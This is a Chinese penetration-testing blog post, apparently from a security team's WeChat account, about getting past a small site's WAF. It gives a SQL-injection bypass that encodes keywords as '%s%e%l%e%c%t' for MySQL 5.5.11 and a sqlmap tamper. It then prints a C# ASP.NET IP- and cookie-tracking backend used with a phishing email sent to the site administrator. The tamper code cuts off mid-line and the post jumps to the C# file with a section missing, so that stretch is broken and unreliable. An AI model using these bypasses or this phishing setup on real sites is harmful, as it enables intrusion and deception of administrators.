一次迂回的渗透测试之旅
原创雪狼别动队 酒仙桥六号部队
2020-10-13原文
这是 酒仙桥六号部队 的第 88 篇文章。
全文共计2460个字，预计阅读时长9分钟。
一、起因
前几天朋友发来一个站，说让我帮他测试一下网站的安全程度，看
到是一个小站就暗暗欣喜，但经过一段时间的尝试后，发现这个网
站虽然功能不咋地但是可以直接getshell的漏洞几乎为0。
二、奇葩的waf
随手一个 and 1=1，有waf？？？？这个小站竟然也有waf？？
emmmmm一个很小众的waf，用的人很少。
本着遇到waf就让对方添加白名单的原则想和朋友说一下。但是转念
一想，不能让他小瞧我啊，怎么能辜负我在他面前吹过的牛皮呐~
好啊那就绕一下！
随手将空格换成+号，竟然绕过了。。。。。好吧，是我太年轻了。
既然有了绕过方法，直接写tamper，翻了一下sqlmap的tamper发
现有可以直接替换的脚本（正好懒得写了）：
意思就是在payload中isspace检查给定的字符是否为空格，如果
是空格的话直接替换为“+”号。既然有注入那就直接丢到sqlmap
中跑吧（能自动就自动吧）。
（Ps：之前看到过某位大师傅写的也是这个waf，可以参考一下：h
ttps://mp.weixin.qq.com/s/jtz2QxCs4jI0WWgNFzTb8Q ， 这
一篇也是WTS绕过，绕过过程也很奇葩。）
但是很奇葩的是，这个上sqlmap也是一片红，怀疑可能是在代码层
面做了一些限制。
既然这样那就自己手注绕过吧。
经 过 测 试 他 用 正 则 将 select
、union等关键字过滤，也不能用/**/等，制表符等也不能用，也
尝 试 了 上 文 中 将 --
%oa放在select后面也没办法绕过，常规绕过基本都测试过了都不
行，便又返回去从数据库的版本入手，后来发现数据库版本为MySQL
5.5.11，这个版本在字母前添加%也会正常解析为原字母，如：%s%
e%l%e%c%t会被解析为select，经过测试，可以绕过其代码层面的
防护。
手注是不可能的，那就重新编写一下tamper
将代码直接添加到上面tamper的后面即可。
next_retVal = ""
i = 0
while i 
bobo.aspx.cs的代码如下:
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;
using System.Text;
namespace XSS
{
public partial class bobo : System.Web.UI.Page
{
public static string EncodeBase64(Encoding encode, string
source)
{
string decode = "";
byte[] bytes = encode.GetBytes(source);
try
{
decode = Convert.ToBase64String(bytes);
}
catch
{
decode = source;
}
return decode;
}
protected void Page_Load(object sender, EventArgs e)
{
string db = "botIPs.txt";
string addr = HttpContext.Current.Request.UserHostAddress;
HttpContext.Current.Response.AddHeader("Access-Control-
Allow-Origin", "*");
HttpContext.Current.Response.AddHeader("Access-Control-
Allow-Credentials", "true");
object getaddrIsin =
HttpContext.Current.Request.QueryString["getaddr"];
if (getaddrIsin !=null && getaddrIsin.ToString() != "")
{
HttpContext.Current.Response.AddHeader("Content-type",
"text/json; charset=utf-8");
object boboCookieIsin=
HttpContext.Current.Request.Cookies["getaddr"];
string Info = "";
if (boboCookieIsin != null && boboCookieIsin.ToString()
!= "")
{
Info = $"var returnCitySN = {{\"cip\": \"{addr}\",
\"bobo\":\"111111\"}};";
Response.Write(Info);
}
else
{
Info= $"var returnCitySN = {{\"cip\": \"{addr}\",
\"bobo\": \"000000\"}};";
}
}
object boboIsin =
HttpContext.Current.Request.QueryString["bobo"];
if (boboIsin != null && boboIsin.ToString() != "")
{
HttpCookie httpCookie = new HttpCookie("bobo");
httpCookie.Value = "bobo";
httpCookie.Expires = DateTime.Now.AddDays(10);
HttpContext.Current.Response.SetCookie(httpCookie);
}
object get_ip =
HttpContext.Current.Request.QueryString["ip"];
if (get_ip != null && get_ip.ToString() != "")
{
string botIP = get_ip.ToString();
StreamReader streamReader = new StreamReader(db);
string line = streamReader.ReadToEnd();
streamReader.Close();
string[] botIPs = line.Split('\n');
if (botIPs.Contains(EncodeBase64(Encoding.Default,
botIP)))
{
Response.Write("ip exist");
}
else
{
StreamWriter streamWriter = new StreamWriter(db);
streamWriter.Write(botIP+"\n");
streamWriter.Close();
}
}
object search=
HttpContext.Current.Request.QueryString["search"];
if (search != null && search.ToString() != "")
{
string ip = search.ToString();
if (File.Exists(db))
{
StreamReader stream = new StreamReader(db);
string line = stream.ReadToEnd();
stream.Close();
string[] botIPs = line.Split('\n');
if (botIPs.Contains(EncodeBase64(Encoding.Default,
ip)))
{
Response.Write("in");
}
else
{
Response.Write("bobo");
}
}
}
}
}
}
Global.asax.cs主要代码如下：
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.SessionState;
namespace XSS
{
public class Global : System.Web.HttpApplication
{
protected void Application_Start(object sender, EventArgs e)
{
}
}
}
效果图如下：
OK，既然代码方面已经完成，那么接下来就构造我们精心制作好的
钓鱼邮件（URL注意编码或者生成短链接）发送给网站管理员，当网
站打开后效果如下：
after long long time......
终于等到管理员上线。
紧接着就给朋友说：嘿伙计，你上线了。经过一系列的彩虹屁后迫
不得已给他修复了。
四、结尾
渗透测试的路上真的有好多磕磕绊绊，也许你可以脱库，但是可能你并不会ge
tshell，这时，只要你换一种思路，也许就能够得到意想不到的结果。
精选留言
用户设置不下载评论
|---|--|
| 0 |  |